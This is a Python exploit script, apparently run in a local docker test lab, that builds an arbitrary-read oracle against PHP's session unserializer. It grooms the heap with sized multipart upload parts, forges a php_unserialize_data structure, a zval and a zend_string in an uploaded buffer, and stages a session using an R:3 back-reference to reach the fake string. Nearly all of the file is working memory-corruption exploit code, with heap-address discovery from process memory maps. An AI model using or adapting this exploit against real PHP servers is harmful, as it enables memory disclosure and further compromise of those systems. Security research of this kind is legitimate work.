#!/usr/bin/env python3
"""smb_oracle.py — the R:n groom-oracle, self-verifying variant.

Producer -> remnant {d, 1} -> consumer multipart:
  - 8192B VALUE part = fake php_unserialize_data at d (groom carrier)
    with entries.used_slots=14 and data[2] -> fake zval -> fake
    zend_string "ORACLEWORKS!!!" (in-buffer)
  - staged session `k|a:2:{i:0;s:9:"WALKOK1!";i:1;R:3;}` -> the
    consumer's nested decode resolves R:3 -> data[2] = OUR zval
  - flush writes the decoded session back to the sess file
  => file contains s:16:"ORACLEWORKS!!!" = ARBITRARY-READ ORACLE LIVE

(The request may still crash later in the post-efree cascade — the
writeback happens at the FIRST update's flush, before the cascade.)
"""
import base64
import socket
import struct
import sys
import time

sys.path.insert(0, "/home/user/php-firing-range/scripts")
import smb_q1_fatal_window as q
import smb_619_state as s

BND = b"G"
IS_STRING_EX = 0x106


def part(name, value, filename=None):
    d = b'Content-Disposition: form-data; name="' + name + b'"'
    out = b"--" + BND + b"\r\n" + d + b"\r\n\r\n" + value + b"\r\n"
    return out


def file_part(name, value, filename=b"a.txt"):
    d = (b'Content-Disposition: form-data; name="' + name + b'"; filename="'
         + filename + b'"')
    return (b"--" + BND + b"\r\n" + d +
            b"\r\nContent-Type: application/octet-stream\r\n\r\n" + value + b"\r\n")


def groom(gaddr, fake_str_addr, fake_str_data, ridx_slot):
    """Fake php_unserialize_data at gaddr; slot ridx_slot -> fake zval at
    +0x400 -> fake zend_string at fake_str_addr with fake_str_data.
    last_dtor/first_dtor point at a PRE-BUILT fake var_dtor_entries at
    +0x800 (used_slots=0, 255-slot capacity) so tmp_var takes the
    existing-entries path: ZERO fresh allocations during the decode
    (a NULL last_dtor made tmp_var emalloc a fresh 4096B dtor chunk
    that best-fit onto d's freed pages and aliased the header)."""
    b = bytearray(8192)
    struct.pack_into("<Q", b, 0x00, gaddr + 0x38)     # last = &entries
    struct.pack_into("<Q", b, 0x08, gaddr + 0x800)   # first_dtor = fake dtor
    struct.pack_into("<Q", b, 0x10, gaddr + 0x800)   # last_dtor  = fake dtor
    struct.pack_into("<Q", b, 0x30, 0x1000)         # max_depth
    # fake var_dtor_entries @ +0x800: used_slots=0, next=NULL, data[255]
    struct.pack_into("<Q", b, 0x800, 0)              # used_slots
    struct.pack_into("<Q", b, 0x808, 0)              # next
    # entries (embedded) @ 0x38: used_slots, next, data[]
    struct.pack_into("<Q", b, 0x38, 14)               # used_slots = 14
    struct.pack_into("<Q", b, 0x40, 0)                # next
    # data[2] (R:3 -> id 2) -> fake zval @ gaddr+0x400
    zval_addr = gaddr + 0x400
    struct.pack_into("<Q", b, 0x48 + 2 * 8, zval_addr)
    # fake zval {value = fake zend_string*, type = IS_STRING_EX}
    struct.pack_into("<Q", b, 0x400, fake_str_addr)
    struct.pack_into("<I", b, 0x408, IS_STRING_EX)
    return bytes(b)


def fake_string(gaddr, off, data):
    """Fake zend_string at gaddr+off holding `data` bytes."""
    b = bytearray(0x100)
    struct.pack_into("<I", b, 0x00, 100)              # refcount high
    struct.pack_into("<I", b, 0x04, 6)                # gc type IS_STRING
    struct.pack_into("<Q", b, 0x08, 0)                # h
    struct.pack_into("<Q", b, 0x10, len(data))        # len
    b[0x18:0x18 + len(data)] = data                   # val
    return bytes(b)


def build_body(gsid, gaddr, sess_token, filedata=b"z" * 4096):
    # fake string lives at groom+0x440; zval points at gaddr+0x440
    g = groom(gaddr, gaddr + 0x440, None, 2)
    fs = fake_string(gaddr, 0x440, b"ORACLEWORKS!!!" + b"\x00")
    g = bytearray(g)
    g[0x440:0x440 + len(fs)] = fs
    g = bytes(g)
    # SMALL decoy parts (4000B values -> 1-page allocs): each nets a free
    # 1-page run to bucket[1] (buf1 freed; the estrndup copy persists),
    # so the FILE_START tree bins and ps_read's page-needs draw from
    # bucket[1] and NEVER split d's 3-page run (bucket[3] head).
    decoys = b"".join(part(b"s%d" % i, b"S" * 4000) for i in range(8))
    # 3MB-session variant: ps_read's zend_string becomes a HUGE mmap
    # (threshold ~= 2MB), so it can NEVER land at d+0 and clobber the
    # fake-d header. Minimal part set; groom's 2-page intermediate takes
    # d (best-fit smallest run), writes our header at d+0, then moves.
    body = (part(b"PHPSESSID", gsid.encode()) +
            part(b"PHP_SESSION_UPLOAD_PROGRESS", b"poc") +
            part(b"g", g) +
            file_part(b"f", filedata) +
            b"--" + BND + b"--\r\n")
    return body


def fire(body):
    s2 = socket.create_connection(("127.0.0.1", 8151), timeout=25)
    s2.sendall((f"POST /ping.php HTTP/1.1\r\nHost: x\r\n"
                f"Content-Type: multipart/form-data; boundary=G\r\n"
                f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
                ).encode() + body)
    buf = b""
    s2.settimeout(25)
    while True:
        try:
            d = s2.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        buf += d
    s2.close()
    return buf.split(b"\r\n", 1)[0].decode(errors="replace") if buf else "(reset)"


def stage(sid, content):
    if len(content) < 100000:
        t64 = base64.b64encode(content).decode()
        q.docker_exec(q.CT["vuln"],
                      f"F=/tmp/sess_{sid}; rm -f $F; echo {t64} | base64 -d > $F; "
                      f"chown nobody:nobody $F; chmod 600 $F")
    else:
        import subprocess
        subprocess.run(["docker", "exec", "-i", q.CT["vuln"], "sh", "-c",
                        f"cat > /tmp/sess_{sid} && chown nobody:nobody /tmp/sess_{sid} "
                        f"&& chmod 600 /tmp/sess_{sid}"],
                       input=content, check=True, timeout=60)


def main():
    print("=== ORACLE TEST: R:3 -> groom slot 2 -> fake string ===")
    q.docker_exec(q.CT["vuln"], "pkill -f 'php -S 0.0.0.0:8080' || true")
    q.healthy(q.VULN, deadline=15)
    time.sleep(0.5)
    sid = f"or{int(time.time())}"
    q.stage_producer("vuln", sid)
    st, _ = q.mp_min(q.VULN, sid)
    print(f"producer: {st}")
    maps = s.get_maps("vuln")
    hrs = s.heap_ranges(maps)
    segs = []
    for i, l in enumerate(maps):
        if "/usr/local/bin/php" in l and "rw-p" in l:
            a, b = [int(x, 16) for x in l.split()[0].split("-")]
            if i + 1 < len(maps):
                a2, b2 = [int(x, 16) for x in maps[i + 1].split()[0].split("-")]
                if a2 == b and "rw-p" in maps[i + 1] and "php" not in maps[i + 1]:
                    segs.append((a2, b2))
    seg = s.read_mem("vuln", segs[0][0], segs[0][1] - segs[0][0])
    d_addr = None
    for off in range(0, len(seg) - 15, 8):
        v = int.from_bytes(seg[off:off + 8], "little")
        lvl = int.from_bytes(seg[off + 8:off + 16], "little")
        if lvl == 1 and (v & 0xFFF) == 0 and s.looks_heap(v, hrs):
            d_addr = v
            break
    print(f"remnant d = 0x{d_addr:x}")
    gsid = f"orc{int(time.time())}"
    # >2MB session => ps_read string is an mmap, never at d. Padding has
    # no '|' so the pipe-format decoder stops after our key cleanly.
    stage(gsid, b'k|a:2:{i:0;s:9:"WALKOK1!";i:1;R:3;}pad|s:' + str(3*1024*1024).encode()             + b':"' + b'A' * (3*1024*1024) + b'";')
    body = build_body(gsid, d_addr, None)
    first = fire(body)
    print(f"consumer: {first}")
    rc, out = q.docker_exec(q.CT["vuln"], f"cat /tmp/sess_{gsid} 2>/dev/null")
    print(f"sess file: {out[:250]!r}")
    hit = "ORACLEWORKS!!!" in out
    print(f"*** ORACLE {'LIVE!!!' if hit else 'not yet'} ***")
    return 0 if hit else 1


if __name__ == "__main__":
    sys.exit(main())


def fire_main(body):
    import socket
    s2 = socket.create_connection(("127.0.0.1", 8151), timeout=25)
    s2.sendall((f"POST /ping.php HTTP/1.1\r\nHost: x\r\n"
                f"Content-Type: multipart/form-data; boundary=G\r\n"
                f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
                ).encode() + body)
    buf = b""
    s2.settimeout(25)
    while True:
        try:
            d = s2.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        buf += d
    s2.close()
    return buf.split(b"\r\n", 1)[0].decode(errors="replace") if buf else "(reset)"
